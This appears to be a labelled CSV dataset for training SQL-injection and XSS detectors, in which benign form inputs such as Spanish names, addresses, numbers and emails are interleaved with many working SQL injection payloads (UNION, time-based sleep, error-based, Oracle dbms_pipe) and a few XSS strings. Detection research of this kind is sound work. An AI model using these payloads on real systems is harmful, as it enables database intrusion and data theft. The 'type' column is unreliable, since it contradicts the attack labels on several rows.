Text,attack_type,Label,type
vera,norm,0,normal
"-7101))) union all select 4587,4587,4587,4587,4587,4587--",sqli,1,sql
calle buenos aires 82 5-d,norm,0,normal
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)# bzoq",sqli,1,sql
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'hmqq'='hmqq",sqli,1,normal
75582707s,norm,0,normal
4ub16ns8rv0do5,norm,0,normal
1'+(select 'kicv' where 1976=1976 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))+',sqli,1,sql
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",sqli,1,sql
32806661j,norm,0,normal
36079,norm,0,normal
1'+(select lptb where 3861=3861 or sleep(5))+',sqli,1,sql
"1'||(select 'noik' from dual where 9851=9851;iif(5257=5257,1,1/0)",sqli,1,sql
jeramey,norm,0,normal
"1'+(select bruk where 1400=1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'",sqli,1,sql
5937893714425522,norm,0,normal
efran,norm,0,normal
"1"") where 7950=7950 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
47162,norm,0,normal
"-3862')) union all select 2495,2495,2495,2495,2495,2495,2495--",sqli,1,sql
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('rvwk'='rvwk",sqli,1,sql
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",sqli,1,sql
empedernido,norm,0,normal
tors,norm,0,normal
sanandreu agramunt,norm,0,normal
"arevalo, 170,",norm,0,normal
"1'||(select 'bvic' from dual where 4839=4839 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'",sqli,1,sql
"1))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((6583=6583",sqli,1,normal
48277,norm,0,normal
costur,norm,0,normal
lorca,norm,0,normal
"1') as tuhc where 4018=4018 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
43320,norm,0,normal
"1"");begin dbms_lock.sleep(5); end and (""vwbx""=""vwbx",sqli,1,sql
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('sied'='sied",sqli,1,sql
48p81o0oo,norm,0,normal
1')) and 2401=4693 and (('ssrm'='ssrm,sqli,1,normal
"payo gomez 188, 4-c",norm,0,normal
"-2625"")) as qfuo where 1980=1980 union all select 1980,1980,1980--",sqli,1,sql
holgachona,norm,0,normal
599iad12a,norm,0,normal
8837,norm,0,normal
1)) order by 1--,sqli,1,sql
1')) or 6793=(select 6793 from pg_sleep(5)) and (('cqwz' like 'cqwz,sqli,1,sql
49694,norm,0,normal
"1"") as eaxo where 2728=2728;waitfor delay '0:0:5'--",sqli,1,sql
1798713909636768,norm,0,normal
ketchum,norm,0,normal
"1"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
10,norm,0,normal
clavero lloveras,norm,0,normal
"1%"") and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"c/ empecinado 134, 3-b",norm,0,normal
"-8538"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
"1') or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
butjosa,norm,0,normal
pettitt,norm,0,normal
o$ficinesca,norm,0,normal
1'))) or sleep(5) and ((('wuwv'='wuwv,sqli,1,normal
8853092721111466,norm,0,normal
8879069271917222,norm,0,normal
1'+(select 'rpds' where 5870=5870 and 4595=4595#,sqli,1,sql
salaberri dvila,norm,0,normal
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('obeh'='obeh",sqli,1,normal
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('npzh'='npzh,sqli,1,sql
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
1%';select (case when (7271=1658) then 7271 else 7271*(select 7271 from information_schema.character_sets) end)#,sqli,1,sql
aldeanueva de santa cruz,norm,0,normal
cuad5in1m3o,norm,0,normal
gallifa,norm,0,normal
1)) as sipp where 1999=1999 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
calabazas de fuentiduea,norm,0,normal
1%')) and (3020=3020)*6703 and (('%'=',sqli,1,normal
1'));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
35is117r,norm,0,normal
car52lit7,norm,0,normal
6u2n8a,norm,0,normal
"1"" and elt(1210=1210,sleep(5)) and ""zhxm""=""zhxm",sqli,1,normal
4672356462399294,norm,0,normal
macreyno,norm,0,normal
"1)) as rhwg where 8843=8843;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
ua de quintana,norm,0,normal
swearing,norm,0,normal
aguadulce,norm,0,normal
4829100959791841,norm,0,normal
"1%') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%'='",sqli,1,sql
88341714w,norm,0,normal
tesalnico,norm,0,normal
"1'+(select pepf where 5071=5071 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-1550' in boolean mode) union all select 9777,9777,9777--",sqli,1,sql
5599,norm,0,normal
ticona,norm,0,normal
"1"")) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""llgb"" like ""llgb",sqli,1,sql
staggs,norm,0,normal
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
orientalista,norm,0,normal
7402575875977830,norm,0,normal
culinario,norm,0,normal
80396628j,norm,0,normal
9202478257950133,norm,0,normal
3946406903398216,norm,0,normal
"fernando poo 23, 8?f",norm,0,normal
"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",xss,2,normal
"1'+(select 'fxhh' where 2571=2571 union all select null,null,null,null,null,null,null--",sqli,1,sql
5e56ir2,norm,0,normal
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('xmwj'='xmwj",sqli,1,sql
"1"";select pg_sleep(5) and ""zhsc""=""zhsc",sqli,1,sql
demren,norm,0,normal
ilve,norm,0,normal
"1"") or (select * from (select(sleep(5)))ydpu) and (""cadh"" like ""cadh",sqli,1,sql
nolay,norm,0,normal
"c/ san juan bautista 66, 1?f",norm,0,normal
"plaza hernan cortes 199, 4f",norm,0,normal
"1"") as iwri where 4921=4921 or (select * from (select(sleep(5)))ydpu)--",sqli,1,sql
"-2803"") union all select 5337,5337,5337,5337,5337,5337,5337#",sqli,1,sql
25471,norm,0,normal
20180,norm,0,normal
e298r4jina715,norm,0,normal
9087,norm,0,normal
"calle manuel maria de arjona 80,",norm,0,normal
macedonia 48,norm,0,normal
parnesi3,norm,0,normal
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""stcv""=""stcv",sqli,1,normal
1%';select sleep(5) and '%'=',sqli,1,sql
09267,norm,0,normal
pensosa,norm,0,normal
"1) as yduh where 6481=6481 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
mordi3nt-e,norm,0,normal
"1%"");select sleep(5)#",sqli,1,sql
1%'));select (case when (3444=8424) then 3444 else 3444*(select 3444 from information_schema.character_sets) end)#,sqli,1,sql
"1 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
-8045))) order by 1--,sqli,1,sql
"1%"");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"1"") or elt(5873=5873,sleep(5))#",sqli,1,normal
"1"" or sleep(5)",sqli,1,normal
randera,norm,0,normal
9036735261224878,norm,0,normal
browne,norm,0,normal
sonne,norm,0,normal
trenaman_bourbault@sms24h.ar,norm,0,normal
64721683m,norm,0,normal
zujovic yvosevich,norm,0,normal
norstar,norm,0,normal
"colon 111, 13-c",norm,0,normal
"1""))) rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
"1'+(select iutk where 6158=6158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",sqli,1,sql
xaviera,norm,0,normal
sonriente,norm,0,normal
"1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('btnl'='btnl",sqli,1,sql
cella,norm,0,normal
ambligonio,norm,0,normal
17405,norm,0,normal
adapuesto,norm,0,normal
1') where 5145=5145;if(2823=3532) select 2823 else drop function kmqw--,sqli,1,sql
"1';select count(*) from generate_series(1,5000000) and 'roca'='roca",sqli,1,sql
3323,norm,0,normal
4381135407580429,norm,0,normal
maala8,norm,0,normal
chakiris@forohh.sa,norm,0,normal
schwuchow9@viajessolomujeres.bj,norm,0,normal
roco del cielo,norm,0,normal
meloling,norm,0,normal
acaudalador,norm,0,normal
13300,norm,0,normal
soldati@legami.so,norm,0,normal
"1%' union all select null,null,null,null--",sqli,1,sql
frailes,norm,0,normal
"1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
renedo sotorro,norm,0,normal
03820,norm,0,normal
40529,norm,0,normal
"-4233%"") or (8459=8459)*4906 and (""%""=""",sqli,1,normal
1') where 1424=1424 and sleep(5)--,sqli,1,sql
47800,norm,0,normal
76156835v,norm,0,normal
pearce,norm,0,normal
matsumiya stuyck,norm,0,normal
07313,norm,0,normal
46529,norm,0,normal
-9178') or 9779=6351,sqli,1,normal
newall@maletti.zw,norm,0,normal
"c/ merced, 23, 3d",norm,0,normal
"1 where 8949=8949 and make_set(8403=8403,8899)--",sqli,1,sql
6920006006312240,norm,0,normal
nazareno,norm,0,normal
san esteban de litera,norm,0,normal
"-4798%'))) union all select 3330,3330,3330#",sqli,1,sql
jetazo,norm,0,normal
azema.alvir@telogis.gf,norm,0,normal
"1%"" and elt(3114=3114,sleep(5))#",sqli,1,normal
kunkel,norm,0,normal
"1'+(select 'kcix' where 1117=1117;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
62746544z,norm,0,normal
desapercib.idamente,norm,0,normal
-6218')) or 2236=4469#,sqli,1,normal
jusmeter-se,norm,0,normal
80537471g,norm,0,normal
moyes,norm,0,normal
escudern,norm,0,normal
"calle regina 18,",norm,0,normal
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",sqli,1,normal
1 or sleep(5)#,sqli,1,normal
cabildeo,norm,0,normal
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""jtgs"" like ""jtgs",sqli,1,sql
6745,norm,0,normal
"-4670"")) or 3038=3038",sqli,1,normal
38844,norm,0,normal
robillar,norm,0,normal
"1)) as mgvw where 4923=4923 union all select null,null,null,null--",sqli,1,sql
osburn,norm,0,normal
"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('crosssitescripting')</script>"">",xss,2,xss
42ec0sei1a1a,norm,0,normal
"plaa cesar vallejo, 58",norm,0,normal
277,norm,0,normal
gaile,norm,0,normal
burg,norm,0,normal
"1' where 7445=7445 union all select null,null,null,null,null,null--",sqli,1,sql
"1)) as kgit where 1919=1919 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
3454478326370479,norm,0,normal
1) as bpap where 7758=7758 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
nufrago,norm,0,normal
"1'||(select 'dpce' from dual where 5261=5261 union all select null,null,null,null,null,null--",sqli,1,sql
32797115n,norm,0,normal
de jaime,norm,0,normal
1) where 8232=8232 and (3020=3020)*6703--,sqli,1,sql
"diamante, 114,",norm,0,normal
"1%')) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""oyfk""=""oyfk",sqli,1,sql
-6200%')) or 8077=4661,sqli,1,normal
reinazgo,norm,0,normal
32027973j,norm,0,normal
"1%' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and '%'='",sqli,1,sql
81208495a,norm,0,normal
jared,norm,0,normal
michels,norm,0,normal
05510,norm,0,normal
-4208%'))) or 1133=9010--,sqli,1,sql
"1) where 8671=8671 and make_set(4931=1642,1642)--",sqli,1,sql
rojo sarri,norm,0,normal
ferree,norm,0,normal
muga sirera,norm,0,normal
"1)) as ynzg where 1926=1926 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
odden,norm,0,normal
05230,norm,0,normal
.lapidosa,norm,0,normal
"1%"");select benchmark(5000000,md5(0x4c4d6142)) and (""%""=""",sqli,1,sql
"1"" and elt(4249=4249,7259) and ""tmxx""=""tmxx",sqli,1,normal
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
63897551d,norm,0,normal
6e665a,norm,0,normal
"calle sobrerroca 96, 7?f",norm,0,normal
45480,norm,0,normal
"-7601""))) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",sqli,1,sql
13082383y,norm,0,normal
"1',(select (case when (8596=8596) then 1 else 8596*(select 8596 from mysql.db) end))",sqli,1,sql
3417226560422216,norm,0,normal
marschew,norm,0,normal
aro,norm,0,normal
12450,norm,0,normal
castilblanco,norm,0,normal
"1'+(select wkay where 5476=5476 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))+'",sqli,1,sql
6144624878722444,norm,0,normal
"santisima cruz, 123 10?b",norm,0,normal
8673,norm,0,normal
"1"")) as szxa where 1501=1501 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
32621,norm,0,normal
"calle capitan godoy beltran, 120",norm,0,normal
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)),sqli,1,sql
2966176869826154,norm,0,normal
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (5468=5468",sqli,1,sql
dotty,norm,0,normal
jochim@ajuntamentdebarcelona2-0.qa,norm,0,normal
"c/ josep ametller i vias, 93,",norm,0,normal
83433277h,norm,0,normal
nelia3,norm,0,normal
delusiva,norm,0,normal
"-5182"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
4518310510128542,norm,0,normal
"c/ ruiz de salazar, 49 4d",norm,0,normal
bru_na,norm,0,normal
da-1m1n,norm,0,normal
marino luis carrillo 50 7?d,norm,0,normal
-1021) as erjh where 7845=7845 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
ananas,norm,0,normal
18129,norm,0,normal
1')) as tlsl where 8467=8467;begin user_lock.sleep(5); end--,sqli,1,sql
flloko-humet@imarbella.ms,norm,0,normal
cinthia,norm,0,normal
carameso yabar,norm,0,normal
c2lea,norm,0,normal
sant vicen de castellet,norm,0,normal
"copons, 11",norm,0,normal
-2364' or 6743=7578,sqli,1,normal
mula,norm,0,normal
t16564l,norm,0,normal
arrechea bellveh,norm,0,normal
schwab.carli@emepleo.info,norm,0,normal
pradeep,norm,0,normal
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
3602043151180886,norm,0,normal
soportador,norm,0,normal
"1%""));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
jawad,norm,0,normal
1));if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
1)) and 7533=7533 and ((8738=8738,sqli,1,normal
-3059') as jhbh where 4056=4056 or (3498=6965)*6965--,sqli,1,sql
"1"") where 1870=1870 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
andruzzi,norm,0,normal
ticiana,norm,0,normal
sagarda,norm,0,normal
"<table background=""javascript:document.cookie=true;"">",xss,2,xss
8961254211923124,norm,0,normal
7656,norm,0,normal
7057231009442608,norm,0,normal
barabash0,norm,0,normal
1') rlike (select (case when (2671=4485) then 1 else 0x28 end)) and ('ezco' like 'ezco,sqli,1,sql
7043934218522889,norm,0,normal
72620654v,norm,0,normal
o'kinghtons camarena,norm,0,normal
espejo jauregui,norm,0,normal
ason0nte,norm,0,normal
herculano,norm,0,normal
"-2321%"") or 2271=7683--",sqli,1,sql
molledo basagaa,norm,0,normal
09352334m,norm,0,normal
alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss,2,normal
1))) and 2006=2006,sqli,1,normal
75000191c,norm,0,normal
"'';!--""<crosssitescripting>=&{()}",xss,2,sql
"1"") where 6367=6367 union all select null,null,null,null,null,null,null#",sqli,1,sql
"de l' aliga 3,",norm,0,normal
negroni@escarba.ki,norm,0,normal
josefa,norm,0,normal
0233016491701103,norm,0,normal
-9700') or 8811=7862,sqli,1,normal
goble,norm,0,normal
-2793') where 2621=2621 union all select 2621#,sqli,1,sql
"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""rthl"" like ""rthl",sqli,1,sql
1%')));select sleep(5) and ((('%'=',sqli,1,sql
c/ guillen santacilla 94,norm,0,normal
90946866j,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
3335,norm,0,normal
0288508062311799,norm,0,normal
"etorbidea atarrabiako 126, 5d",norm,0,normal
leandro,norm,0,normal
1');select sleep(5)#,sqli,1,sql
53933880f,norm,0,normal
"1""))) and (select * from (select(sleep(5)))fzno) and (((""uncg""=""uncg",sqli,1,sql
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('mevd'='mevd",sqli,1,sql
abdel-az,norm,0,normal
"1'+(select lang where 4191=4191 union all select null,null#",sqli,1,sql
deba,norm,0,normal
fahey@colorprint.ve,norm,0,normal
"1');select benchmark(5000000,md5(0x4c4d6142))",sqli,1,sql
"1') as tvqn where 2967=2967;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1'||(select 'sbft' where 8748=8748;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
6121365584311454,norm,0,normal
"-8347%') union all select 7643,7643,7643--",sqli,1,sql
